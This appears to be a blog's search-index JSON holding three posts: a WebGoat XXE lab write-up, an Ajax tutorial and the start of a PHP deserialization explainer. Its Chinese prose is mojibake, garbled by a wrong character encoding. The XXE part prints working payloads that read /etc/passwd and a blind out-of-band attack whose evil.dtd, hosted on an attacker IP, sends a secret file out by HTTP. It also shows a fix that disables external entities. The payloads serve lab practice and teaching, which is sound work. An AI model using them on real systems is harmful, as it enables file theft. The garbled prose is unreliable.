·æ‰ä¸ä¼šå°†å…¶è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²ã€‚è€Œä¸”å›åˆ°ä¸Šä¸€å¤„åœ°æ–¹ï¼Œå¯ä»¥çœ‹åˆ°ä»–æ˜¯æ¥åˆ¤æ–­sessionä¸­æ˜¯å¦å«æœ‰applysecurityå±æ€§æ¥è®¾ç½®çš„ï¼Œä½†è¿™é‡Œä¼¼ä¹åœ¨bpä¸Šä¹Ÿæ²¡æœ‰è¯¥å±æ€§ï¼Œè¿™æ„å‘³ç€secureå°±åº”è¯¥æ˜¯falseã€‚ è¿™é‡Œå…ˆæ”¾ä¸€ä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“è¿™é‡Œè‚¯å®šæ˜¯æ”¯æŒè§£æå¤–éƒ¨DTDçš„ï¼Œæˆ‘ä»¬æ¥ç€åˆ†æ var xsr = xif.createXMLStreamReader(new StringReader(xml));ï¼šä½¿ç”¨ XMLInputFactory åˆ›å»ºä¸€ä¸ª XMLStreamReader å¯¹è±¡ï¼Œç”¨äºè§£æ XML å­—ç¬¦ä¸²ã€‚ æœ€ååˆ›å»ºä¸€ä¸ªUnmarshallerå¯¹è±¡ã€‚è¿”å›çš„å€¼æ˜¯xmlç»è¿‡unmarshalæ–¹æ³•å¤„ç†çš„å€¼ã€‚ç”±äºunmarshalåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­è§£æäº†XMLï¼ˆè¯¥XMLå†…å®¹ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼‰ï¼Œå¯¼è‡´XXEæ³¨å…¥ è¿™é‡Œç”±äºæ˜¯è§£æå¤–éƒ¨DTDçš„ï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰ä»»ä½•è¿‡æ»¤æ‰‹æ®µï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éšä¾¿æ³¨å…¥å³å¯ã€‚ ä»£ç ä¿®å¤ æˆ‘ä»¬åªéœ€è¦ç¦æ­¢è§£æå¤–éƒ¨DTDå³å¯ï¼Œå¯¹åº”ä»£ç ï¼š package XXE; import lombok.var; import javax.xml.bind.JAXBContext; import javax.xml.bind.JAXBException; import javax.xml.stream.XMLInputFactory; import javax.xml.stream.XMLStreamException; import java.io.StringReader; public class XXERepair { public void Repair() throws JAXBException, XMLStreamException { String xml = \"&lt;?xml version=\\\"1.0\\\"?&gt; \" + \"&lt;!DOCTYPE doc [ \" + \"&lt;!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\"&gt; \" + \"]&gt;&lt;comment&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/comment&gt;\"; var jc = JAXBContext.newInstance(Comment.class); // åˆ›å»ºäº†æˆ‘ä»¬çš„å·¥å‚ è¯»å–xmlçš„ä¸€ä¸ªå·¥å‚ var xif = XMLInputFactory.newInstance(); // ä¸æ”¯æŒå¤–éƒ¨å®ä½“ // åé¢ä¸¤è¡Œæ˜¯å¤šåŠ çš„ä»£ç  xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); // ä¸æ”¯æŒdtd xif.setProperty(XMLInputFactory.SUPPORT_DTD, false); var xsr = xif.createXMLStreamReader(new StringReader(xml)); // å°†æˆ‘ä»¬çš„xml å˜æˆæˆ‘ä»¬çš„javaå¯¹è±¡ var unmarshaller = jc.createUnmarshaller(); unmarshaller.unmarshal(xsr); } public static void main(String[] args) throws JAXBException, XMLStreamException { XXERepair test = new XXERepair(); test.Repair(); } } å¯ä»¥çœ‹åˆ°è®¾ç½®äº†XMLInputFactoryå¯¹åº”çš„ä¸¤ä¸ªå±æ€§ä¸ºfalseã€‚ å…³å¡äºŒ è¿™é‡Œè¯´è®©æˆ‘ä»¬å°è¯•ä¸ä¸Šæ¬¡ç›¸åŒçš„æ”»å‡»ç›®çš„ï¼Œæ ¹æ®æç¤ºä»–è¯´æœåŠ¡å™¨å¯èƒ½ä¼šæ¥å—æ„æƒ³ä¸åˆ°çš„æ•°æ®æ ¼å¼ã€‚æˆ‘ä»¬æŠ“åŒ…çœ‹çœ‹æœ‰ä½•å˜åŒ– å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯jsonæ ¼å¼ï¼Œæ ¹æ®æç¤ºæˆ‘ä»¬è‚¯å®šå¯ä»¥çŒœåˆ°è¿™é‡Œå¯ä»¥ä¿®æ”¹jsonä¸ºxmlå³å¯ &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY rabbit SYSTEM \"file:///\" &gt;]&gt; &lt;comment&gt;&lt;text&gt;&amp;rabbit;&lt;/text&gt;&lt;/comment&gt; å¯ä»¥çœ‹åˆ°æˆåŠŸæ³¨å…¥ ä»£ç åˆ†æ è¿™é‡Œå¯ä»¥çœ‹åˆ°å°†httpè¯·æ±‚ä¸­çš„conten-typeçš„å†…å®¹èµ‹å€¼ç»™äº†contenttypeå‚æ•°ï¼Œæ¥ç€é€šè¿‡ APPLICATION_JSON_VALUE.equals(contentType)ä¸contentType.contains(MediaType.APPLICATION_XML_VALUE)æ¥åˆ¤æ–­æ ¼å¼ä¸ºxmlè¿˜æ˜¯jsonæ ¼å¼ï¼Œéšæœºé€‰æ‹©å¯¹åº”çš„è§£æå™¨è¿›è¡Œè§£æã€‚ ä¹‹åçš„xmlè§£æå¤„ç†æ–¹æ³•ä¸ä¸Šä¸€å…³ç›¸åŒï¼Œæ²¡å˜åŒ–ï¼Œæ¼æ´åŸç†ä¸€è‡´ï¼Œä¸èµ˜è¿°äº† ä»£ç ä¿®å¤ ä¸ä¸Šä¸€å…³ç±»ä¼¼ï¼Œä¿®æ”¹è‡³ä¸ä¸Šä¸€å…³ç›¸åŒå³å¯ å…³å¡ä¸‰ è¿™å…³è€ƒå¯Ÿxxeç›²æ³¨ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰webwolfæœåŠ¡å™¨ï¼Œå°±ç”¨çš„kaliçš„httpæœåŠ¡äº†ã€‚ æ€è·¯å°±æ˜¯é€šè¿‡fileåè®®è¯»å–åˆ°ç›®æ ‡æ–‡ä»¶ï¼Œæ¥ç€é€šè¿‡å‚æ•°å®ä½“çš„ä½œç”¨å°†å…¶æ„é€ ä¸ºhttpè¯·æ±‚ï¼Œå»è¯·æ±‚æˆ‘ä»¬çš„æ”»å‡»æœºï¼Œæœ€ç»ˆé€šè¿‡æŸ¥çœ‹è¯·æ±‚æ—¥å¿—å³å¯çœ‹åˆ°ç›¸åº”çš„æ–‡ä»¶å†…å®¹ã€‚ é¦–å…ˆåœ¨bpä¸Šå‘é€å¦‚ä¸‹å†…å®¹ï¼Œæ¥ç€åœ¨æ”»å‡»æœºä¸Šæ„é€ evil.dtdæ–‡ä»¶ &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY % dtd SYSTEM \"http://192.168.246.130:8000/evil.dtd\"&gt;%dtd;%print;%send;]&gt; &lt;comment&gt;&lt;text&gt;hacker&lt;/text&gt;&lt;/comment&gt; #evil.dtd &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!ENTITY % file SYSTEM \"file:///home/webgoat/.webgoat-8.1.0//XXE/secret.txt\"&gt; &lt;!ENTITY % print \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.246.130:8000/landing?text=%file;'&gt;\"&gt; æ„é€ å¥½xmlæ•°æ®å‘é€å³å¯ï¼Œæœ€ç»ˆåœ¨kaliä¸Šå³å¯çœ‹åˆ°æ–‡ä»¶å†…å®¹ ä»£ç åˆ†æ è¿™é‡Œå¯ä»¥ä¸ç¬¬ä¸€å…³ä»£ç è¿›è¡Œå¯¹æ¯”ï¼Œå°±æ˜¯ç¼ºå°‘ä¸‹åˆ—ä»£ç ã€‚åˆ é™¤äº†æ•°æ®çš„å›æ˜¾ï¼Œå‰©ä¸‹çš„è¯ä¸ç¬¬ä¸€å…³å°±ç›¸åŒäº† if (checkSolution(comment)) { return success(this).build(); } ä»£ç ä¿®å¤ ä¸ç¬¬ä¸€å…³ä¸€è‡´ åä¹ã€å‚è€ƒæ–‡ç«  https://xz.aliyun.com/t/3357#toc-8 WebGoat (A4) XML External Entities (XXE) é€šè¿‡webgoat-xxeã€jwtå­¦ä¹ Javaä»£ç å®¡è®¡ WebGoatä»£ç å®¡è®¡-05-XXEæ³¨å…¥ JAVAä»£ç å®¡è®¡ä¹‹æ·±å…¥XXEæ¼æ´æŒ–æ˜ä¸é˜²å¾¡ https://www.cnblogs.com/zhengna/p/15740341.html --é¶åœºå®è·µå‚è€ƒ","categories":["å¸¸è§topæ¼æ´"]},{"title":"Ajaxè¯¦è§£","path":"/2023/07/27/ajax-xiang-jie/","content":"Ajaxè¯¦è§£ 0x01 ç®€ä»‹ AJAX å…¨ç§°ä¸º Asynchronous JavaScript And XMLï¼Œå°±æ˜¯å¼‚æ­¥çš„ JS å’Œ XMLã€‚AJAXæ˜¯ä¸€ç§ç”¨äºåˆ›å»ºå¿«é€ŸåŠ¨æ€ç½‘é¡µçš„æŠ€æœ¯ã€‚é€šè¿‡AJAXå¯ä»¥åœ¨æµè§ˆå™¨ä¸­å‘æœåŠ¡å™¨å‘é€å¼‚æ­¥è¯·æ±‚ï¼ŒAjaxå¯ä»¥ä½¿ç½‘é¡µå®ç°å¼‚æ­¥æ›´æ–°ã€‚è¿™æ„å‘³ç€å¯ä»¥åœ¨ä¸é‡æ–°åŠ è½½æ•´ä¸ªç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯¹ç½‘é¡µçš„æŸéƒ¨åˆ†è¿›è¡Œæ›´æ–°ã€‚AJAXä¸æ˜¯æ–°çš„ç¼–ç¨‹è¯­è¨€ï¼Œè€Œæ˜¯ä¸€ç§å°†ç°æœ‰çš„æ ‡å‡†ç»„åˆåœ¨ä¸€èµ·ä½¿ç”¨çš„æ–°æ–¹å¼ã€‚ 1.1 ä»€ä¹ˆæ˜¯åŒæ­¥è¯·æ±‚ï¼Ÿ åŒæ­¥è¯·æ±‚æ˜¯æŒ‡å½“å‰å‘å‡ºè¯·æ±‚åï¼Œæµè§ˆå™¨ä»€ä¹ˆéƒ½ä¸èƒ½åšï¼Œå¿…é¡»å¾—ç­‰åˆ°è¯·æ±‚å®Œæˆè¿”å›æ•°æ®ä¹‹åï¼Œæ‰ä¼šæ‰§è¡Œåç»­çš„ä»£ç ã€‚ç›¸å½“äºç”Ÿæ´»ä¸­çš„æ’é˜Ÿï¼Œå¿…é¡»ç­‰å¾…å‰ä¸€ä¸ªäººå®Œæˆè‡ªå·±çš„äº‹ç‰©ï¼Œåä¸€ä¸ªäººæ‰èƒ½æ¥ç€åŠã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“JSä»£ç åŠ è½½åˆ°å½“å‰AJAXçš„æ—¶å€™ä¼šæŠŠé¡µé¢é‡Œæ‰€æœ‰çš„ä»£ç åœæ­¢åŠ è½½ï¼Œå½“è¿™ä¸ªAJAXæ‰§è¡Œå®Œæ¯•åæ‰ä¼šç»§ç»­è¿è¡Œå…¶ä»–ä»£ç ã€‚ 1.2 ä»€ä¹ˆæ˜¯å¼‚æ­¥è¯·æ±‚ï¼Ÿ å¼‚æ­¥è¯·æ±‚å°±å½“å‘å‡ºè¯·æ±‚çš„åŒæ—¶ï¼Œæµè§ˆå™¨å¯ä»¥ç»§ç»­åšä»»ä½•äº‹ï¼ŒAjaxå‘é€è¯·æ±‚å¹¶ä¸ä¼šå½±å“é¡µé¢çš„åŠ è½½ä¸ç”¨æˆ·çš„æ“ä½œï¼Œç›¸å½“äºæ˜¯åœ¨ä¸¤æ¡çº¿ä¸Šï¼Œå„èµ°å„çš„ï¼Œäº’ä¸å½±å“ã€‚ä¸€èˆ¬é»˜è®¤å€¼ä¸ºtrueã€‚å¼‚æ­¥è¯·æ±‚å¯ä»¥å®Œå…¨ä¸å½±å“ç”¨æˆ·çš„ä½“éªŒæ•ˆæœï¼Œæ— è®ºè¯·æ±‚çš„æ—¶é—´é•¿æˆ–è€…çŸ­ï¼Œç”¨æˆ·å¯ä»¥ä¸“å¿ƒçš„æ“ä½œé¡µé¢çš„å…¶ä»–å†…å®¹ï¼Œå¹¶ä¸ä¼šæœ‰ç­‰å¾…çš„æ„Ÿè§‰ã€‚ 1.3 XML XMLæ˜¯ä¸€ç§å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œè¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚XMLå’Œ HTMLç±»ä¼¼ï¼Œä½†XMLä¸­æ²¡æœ‰é¢„å®šä¹‰æ ‡ç­¾ï¼Œå…¨éƒ½æ˜¯è‡ªå®šä¹‰æ ‡ç­¾ï¼Œç”¨æ¥è¡¨ç¤ºä¸€äº›æ•°æ®ã€‚æ—©æœŸ AJAX æºå¸¦çš„æ•°æ®ç±»å‹å’Œè¿”å›çš„æ•°æ®ç±»å‹ä¸ºxmlå½¢å¼ï¼Œè¿™ä¹Ÿæ˜¯ AJAX åç§°çš„ç”±æ¥ã€‚ å°½ç®¡ X åœ¨ Ajax ä¸­ä»£è¡¨ XMLï¼Œä½†ç”±äºJSONçš„è®¸å¤šä¼˜åŠ¿ï¼Œæ¯”å¦‚æ›´åŠ è½»é‡ä»¥å’Œä½œä¸º Javascript çš„ä¸€éƒ¨åˆ†ï¼Œç›®å‰ JSON çš„ä½¿ç”¨æ¯” XML æ›´åŠ æ™®éã€‚ 1.4 ä¼˜ç¼ºç‚¹ **ä¼˜ç‚¹ï¼š**å¯ä»¥æ— éœ€åˆ·æ–°é¡µé¢è€Œä¸æœåŠ¡å™¨ç«¯è¿›è¡Œé€šä¿¡ï¼›å…è®¸ä½ æ ¹æ®ç”¨æˆ·äº‹ä»¶æ¥æ›´æ–°éƒ¨åˆ†é¡µé¢å†…å®¹ã€‚ **ç¼ºç‚¹ï¼š**æ²¡æœ‰æµè§ˆå†å²ï¼Œä¸èƒ½å›é€€ï¼›å­˜åœ¨è·¨åŸŸé—®é¢˜ï¼›SEOï¼ˆæœç´¢å¼•æ“ä¼˜åŒ–ï¼‰ä¸å‹å¥½ï¼Œå› ä¸ºæ•°æ®æ˜¯åŠ¨æ€åˆ›å»ºçš„ï¼Œçˆ¬è™«æ˜¯çˆ¬ä¸åˆ°çš„ã€‚ 0x02 ajaxè¯·æ±‚çš„åŸºæœ¬æµç¨‹ è¦å®Œæ•´å®ç°ä¸€ä¸ªAJAXå¼‚æ­¥è°ƒç”¨å’Œå±€éƒ¨åˆ·æ–°,é€šå¸¸éœ€è¦ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤: åˆ›å»º XMLHttpRequest è¯·æ±‚å¯¹è±¡, å³åˆ›å»ºä¸€ä¸ªå¼‚æ­¥è°ƒç”¨å¯¹è±¡ã€‚ï¼ˆ new XMLHttpRequest() ï¼‰ æ‰“å¼€è¯·æ±‚åœ°å€ï¼ŒæŒ‡å®šè¯·æ±‚æ–¹å¼**ã€‚**ï¼ˆopenï¼‰ è®¾ç½®å“åº”HTTPè¯·æ±‚çŠ¶æ€å˜åŒ–çš„å‡½æ•°. å‘é€HTTPè¯·æ±‚ã€‚ï¼ˆsendï¼‰ ç›‘å¬å¯¹åº”çš„è¯·æ±‚çŠ¶æ€çš„å˜åŒ–ã€‚ï¼ˆ readystatechangeäº‹ä»¶ ï¼‰ è¯»å–å“åº”æ•°æ®ï¼Œä½¿ç”¨ JavaScript å’Œ DOM å®ç°å±€éƒ¨åˆ·æ–°ã€‚ 1.åˆ›å»ºè¯·æ±‚å¯¹è±¡ ä¸ºäº†ä½¿ç”¨ JavaScript å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ª http è¯·æ±‚ï¼Œä½ éœ€è¦ä¸€ä¸ªåŒ…å«å¿…è¦å‡½æ•°åŠŸèƒ½çš„å¯¹è±¡å®ä¾‹ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¼šæœ‰ XMLHttpRequest çš„åŸå› ã€‚è¿™æ˜¯ IE æµè§ˆå™¨çš„ ActiveX å¯¹è±¡ XMLHTTP çš„å‰èº«ã€‚éšå Mozillaï¼ŒSafari å’Œå…¶ä»–æµè§ˆå™¨ä¹Ÿéƒ½å®ç°äº†ç±»ä¼¼çš„æ–¹æ³•ï¼Œè¢«ç§°ä¸º XMLHttpRequestã€‚åŒæ—¶ï¼Œå¾®è½¯ä¹Ÿå®ç°äº† XMLHttpRequest æ–¹æ³•ã€‚ if (window.XMLHttpRequest) { // Mozilla, Safari, IE7+ ... httpRequest = new XMLHttpRequest(); } else if (window.ActiveXObject) { // IE 6 åŠä»¥ä¸‹ httpRequest = new ActiveXObject(\"Microsoft.XMLHTTP\"); } 2.æ‰“å¼€è¯·æ±‚åœ°å€ï¼ŒæŒ‡å®šè¯·æ±‚æ–¹å¼ open() çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ HTTP è¯·æ±‚æ–¹æ³•ï¼Œæœ‰ GETï¼ŒPOSTï¼ŒHEAD ä»¥åŠæœåŠ¡å™¨æ”¯æŒçš„å…¶ä»–æ–¹æ³•ï¼Œæ–¹æ³•ä¸€å®šè¦æ˜¯å¤§å†™å­—æ¯ï¼Œå¦åˆ™å…¶ä»–ä¸€äº›æµè§ˆå™¨ï¼ˆæ¯”å¦‚ FireFoxï¼‰å¯èƒ½æ— æ³•å¤„ç†è¿™ä¸ªè¯·æ±‚ã€‚ ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä½ è¦å‘é€çš„ URLã€‚ ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œç”¨äºè®¾ç½®è¯·æ±‚æ˜¯å¦æ˜¯å¼‚æ­¥çš„ã€‚å¦‚æœè®¾ä¸º true (é»˜è®¤å€¼)ï¼Œå³å¼€å¯å¼‚æ­¥ï¼ŒJavaScript å°±ä¸ä¼šåœ¨æ­¤è¯­å¥é˜»å¡ï¼Œä½¿å¾—ç”¨æˆ·èƒ½åœ¨æœåŠ¡å™¨è¿˜æ²¡æœ‰å“åº”çš„æƒ…å†µä¸‹ä¸é¡µé¢è¿›è¡Œäº¤äº’ã€‚ httpRequest.open('GET', 'http://www.example.org/some.file', true); 3.è®¾ç½®å“åº”HTTPè¯·æ±‚çŠ¶æ€å˜åŒ–çš„å‡½æ•° å¦‚æœä½ ä½¿ç”¨ POST è¯·æ±‚ï¼Œé‚£å°±éœ€è¦è®¾ç½®è¯·æ±‚çš„ MIME ç±»å‹ï¼Œè®¾ç½®è¯·æ±‚å¤´ã€‚ Content-Type:ç”¨äºè®¾å®šè¯·æ±‚ä½“ä¸­å‚æ•°çš„ç±»å‹ httpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 4.å‘é€HTTPè¯·æ±‚ send() æ–¹æ³•çš„å‚æ•°å¯ä»¥æ˜¯ä»»ä½•ä½ æƒ³å‘é€ç»™æœåŠ¡å™¨çš„å†…å®¹ï¼Œå¦‚æœæ˜¯ POST è¯·æ±‚çš„è¯ï¼Œæ•°æ®å°†åœ¨è¯·æ±‚ä½“ä¸­å‘é€åˆ°æœåŠ¡ç«¯ï¼Œå‘é€æ•°æ®åº”è¯¥ç”¨æœåŠ¡å™¨å¯ä»¥è§£æçš„æ ¼å¼ï¼ŒåƒæŸ¥è¯¢è¯­å¥ã€‚ httpRequest.send( \"name=value&amp;anothername=\"+encodeURIComponent(myVar)+\"&amp;so=on\" ); å¦‚æœæ˜¯ GET è¯·æ±‚ä¸€èˆ¬ä¸ä¼ è¾“å‚æ•° httpRequest.send(); 5.ç›‘å¬è¯·æ±‚çŠ¶æ€çš„å˜åŒ– åªè¦ readyState å±æ€§å‘ç”Ÿå˜åŒ–ï¼Œå°±ä¼šè°ƒç”¨ç›¸åº”çš„å¤„ç†å‡½æ•°ã€‚è¿™ä¸ªå›è°ƒå‡½æ•°ä¼šè¢«ç”¨æˆ·çº¿ç¨‹æ‰€è°ƒç”¨ã€‚XMLHttpRequest.onreadystatechange ä¼šåœ¨ XMLHttpRequest çš„readyState å±æ€§å‘ç”Ÿæ”¹å˜æ—¶è§¦å‘ readystatechange (en-US) äº‹ä»¶çš„æ—¶å€™è¢«è°ƒç”¨ã€‚ httpRequest.onreadystatechange = function () { } 6.è¯»å–å“åº”æ•°æ®ï¼Œå¹¶åšç›¸åº”å¤„ç† httpRequest.onreadystatechange = function () { //readyState æ˜¯è¯·æ±‚å¯¹è±¡ä¸­çš„ä¸€ä¸ªå±æ€§ 4è¡¨ç¤ºæˆåŠŸ //status æ˜¯ http çŠ¶æ€ç  if (httpRequest.readyState == 4 &amp;&amp; /^2\\d{2}$/.test(httpRequest.status)) { console.log(httpRequest.status); //çŠ¶æ€ç  console.log(httpRequest.statusText); //çŠ¶æ€å­—ç¬¦ä¸² console.log(httpRequest.getAllResponseHeaders()); //æ‰€æœ‰å“åº”å¤´ console.log(httpRequest.response); //å“åº”ä½“ } } 0x03 å–æ¶ˆè¯·æ±‚ å¦‚æœè¯¥è¯·æ±‚å·²è¢«å‘å‡ºï¼ŒXMLHttpRequest.abort() æ–¹æ³•å°†ç»ˆæ­¢è¯¥è¯·æ±‚ã€‚ httpRequest.abort()","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"æµ…æååºåˆ—åŒ–","path":"/2023/07/27/qian-xi-fan-xu-lie-hua/","content":"PHPååºåˆ—åŒ– 0x01 ç®€ä»‹ ä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Ÿ å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸² ä¸ºä»€ä¹ˆè½¬æ¢ï¼š1.æŒä¹…ä¿å­˜ã€‚2.æ–¹ä¾¿ç½‘ç»œä¼ è¾“ï¼Œä¾‹å¦‚sessionç¼“å­˜ï¼Œcookieç­‰ ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–ï¼Ÿ å­—ç¬¦ä¸²è½¬æ¢æˆå¯¹è±¡ phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å‡½æ•°ï¼š åºåˆ—åŒ–ï¼šserialize() ååºåˆ—åŒ–ï¼šunserialize() tipï¼šå¯¹å­—ç¬¦ä¸²è¿›è¡Œåºåˆ—åŒ–åæ˜¯å®ƒæœ¬èº«**ï¼ˆctfshow web260ï¼‰** æºç ï¼š &lt;?php error_reporting(0); highlight_file(__FILE__); include('flag.php'); if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){ echo $flag; } //å› æ­¤ç›´æ¥?ctfshow=/ctfshow_i_love_36D/ å³å¯ 0X02 ä¸ºä½•è¦ PHP çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ– çœ‹åˆ°è¿™é‡Œï¼Œè‚¯å®šä¼šæœ‰äººé—®è¿™ä¸ªé—®é¢˜ï¼Œå¦‚æœè¯´ json æ˜¯ä¸ºäº†ä¼ é€’æ•°æ®çš„æ–¹ä¾¿æ€§ï¼Œé‚£ä¹ˆ PHP çš„åºåˆ—åŒ–åˆæ˜¯ä¸ºäº†ä»€ä¹ˆå‘¢ï¼Ÿ å½“ç„¶ï¼Œä¼ é€’æ•°æ®çš„æ–¹ä¾¿è‚¯å®šæ˜¯è¿™ç§å‹ç¼©å¹¶æ ¼å¼åŒ–å­˜å‚¨çš„ä¸€å¤§å…±åŒçš„å±æ€§ï¼Œé‚£ä¹ˆåºåˆ—åŒ–é™¤äº†è¿™ç§å±æ€§ä»¥å¤–è¿˜æœ‰ä»€ä¹ˆç‰¹æ€§å‘¢ï¼Ÿè¦æ˜¯åªæ˜¯è¿™æ ·é‚£å¹²è„†ä¸å¦‚ç›´æ¥ç”¨ json å¥½äº†ï¼Œå½“ç„¶æœ‰ï¼Œä»ä¸Šé¢çš„å®éªŒä¸­ä½ æ²¡å‘ç°å—ï¼Ÿæˆ‘ä»¬æŠŠä¸€ä¸ªå®ä¾‹åŒ–çš„å¯¹è±¡é•¿ä¹…åœ°å­˜å‚¨åœ¨äº†è®¡ç®—æœºçš„ç£ç›˜ä¸Šï¼Œæ— è®ºä»€ä¹ˆæ—¶å€™è°ƒç”¨éƒ½èƒ½æ¢å¤åŸæ¥çš„æ ·å­ï¼Œè¿™å…¶å®æ˜¯ä¸ºäº†è§£å†³ PHP å¯¹è±¡ä¼ é€’çš„ä¸€ä¸ªé—®é¢˜,å› ä¸º PHP æ–‡ä»¶åœ¨æ‰§è¡Œç»“æŸä»¥åå°±ä¼šå°†å¯¹è±¡é”€æ¯ï¼Œé‚£ä¹ˆå¦‚æœä¸‹æ¬¡æœ‰ä¸€ä¸ªé¡µé¢æ°å¥½è¦ç”¨åˆ°åˆšåˆšé”€æ¯çš„å¯¹è±¡å°±ä¼šæŸæ‰‹æ— ç­–ï¼Œæ€»ä¸èƒ½ä½ æ°¸è¿œä¸è®©å®ƒé”€æ¯ï¼Œç­‰ç€ä½ å§ï¼Œäºæ˜¯äººä»¬å°±æƒ³å‡ºäº†ä¸€ç§èƒ½é•¿ä¹…ä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œè¿™å°±æ˜¯ PHP çš„åºåˆ—åŒ–ï¼Œé‚£å½“æˆ‘ä»¬ä¸‹æ¬¡è¦ç”¨çš„æ—¶å€™åªè¦ååºåˆ—åŒ–ä¸€ä¸‹å°± ok å•¦ï¼Œæ˜¯ä¸æ˜¯å¾ˆæ–¹ä¾¿ï¼Ÿ 0x03 å¸¸è§çš„åºåˆ—åŒ–æ ¼å¼ äºŒè¿›åˆ¶æ ¼å¼ å­—èŠ‚æ•°ç»„ jsonå­—ç¬¦ä¸² xmlå­—ç¬¦ä¸² 0x04 æ¡ˆä¾‹ æ•°ç»„åºåˆ—åŒ– &lt;?php $a = array('hello','hi'); $a_ser = serialize($a); echo $a_ser; ?&gt; ç»“æœï¼š a:2:{i:0;s:5:\"hello\";i:1;s:2:\"hi\";} 2ï¼šè¡¨ç¤ºaæœ‰ä¸¤ä¸ªå±æ€§ iï¼šè¡¨ç¤ºintå‹æ•°æ®ï¼›0ï¼šè¡¨ç¤ºä¸‹æ ‡0 sï¼šè¡¨ç¤ºstringå­—ç¬¦ä¸²æ•°ç»„ï¼›5ï¼šé•¿åº¦ä¸º5 è§£æï¼š a - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string å¯¹è±¡åºåˆ—åŒ– &lt;?php class Student{ public $name; public $age; function __construct(){ $this-&gt;name = 'abab'; $this-&gt;age = 18; } function pr(){ return $this-&gt;name; return $this-&gt;age; } } $stu = new Student(); $stu_ser = serialize($stu); echo $stu_ser ?&gt; ç»“æœï¼š O:7:\"Student\":2:{s:4:\"name\";s:4:\"abab\";s:3:\"age\";i:18;} æ³¨ï¼šåºåˆ—åŒ–åçš„å†…å®¹åªæœ‰æˆå‘˜å˜é‡ï¼Œæ²¡æœ‰æˆå‘˜å‡½æ•° è¿˜æœ‰ä¸€ç§æˆå‘˜å˜é‡å°±æ˜¯protectedç±»å‹ &lt;?php class test{ public $aa; private $bb; protected $cc; function __construct(){ $this-&gt;aa = 'aaa'; $this-&gt;bb = 'bbb'; $this-&gt;cc = 'ccc'; } } $d = new test(); $d_ser = serialize($d); echo $d_ser; ?&gt; å¦‚æœæ˜¯privateç±»å‹ï¼Œä¼šåœ¨å˜é‡åå‰åŠ ä¸Š**\\x00ç±»å\\x00**ï¼Œå¦‚æœæ˜¯protectedç±»å‹ï¼Œåˆ™ä¼šåŠ ä¸Š**\\x00*\\x00**ï¼Œ è¿™äº›éƒ½æ˜¯ä¸å¯è§å­—ç¬¦ è¾“å‡ºåˆ™ä¼šå¯¼è‡´ä¸å¯è§å­—ç¬¦\\x00çš„ä¸¢å¤± ç»“æœï¼š O:4:\"test\":3:{s:2:\"aa\";s:3:\"aaa\";s:8:\"testbb\";s:3:\"bbb\";s:5:\"*cc\";s:3:\"ccc\";} å¦‚æœéœ€è¦æœ¬åœ°å­˜å‚¨æ¨èâ€œurlencodeâ€ urlencode($d_ser); åºåˆ—åŒ–å‡½æ•°serialize() é¦–å…ˆæˆ‘åˆ›ä¸€ä¸ªCtfç±» é‡Œé¢å†™äº†ä¸‰ä¸ªå±æ€§ ååˆ›å»ºäº†ä¸€ä¸ªctferå¯¹è±¡ å°†Ctfç±»é‡Œçš„ä¿¡æ¯è¿›è¡Œäº†æ”¹å˜ã€‚å¦‚æœåé¢è¿˜è¦ç”¨åˆ°è¿™ä¸ªå¯¹è±¡ï¼Œå°±å¯ä»¥å…ˆå°†è¿™ä¸ªå¯¹è±¡è¿›è¡Œå®ä¾‹åŒ–ã€‚ç”¨çš„æ—¶å€™åœ¨ååºåˆ—åŒ–å‡ºæ¥å°±okäº†ã€‚ serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œ__sleep()æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚ å¯ä»¥åœ¨__sleep()æ–¹æ³•é‡Œå†³å®šå“ªäº›å±æ€§å¯ä»¥è¢«åºåˆ—åŒ–ã€‚å¦‚æœæ²¡æœ‰__sleep()æ–¹æ³•åˆ™é»˜è®¤åºåˆ—åŒ–æ‰€æœ‰å±æ€§ å®ä¾‹ï¼š å³__sleep()æ–¹æ³•ä½¿ flag age 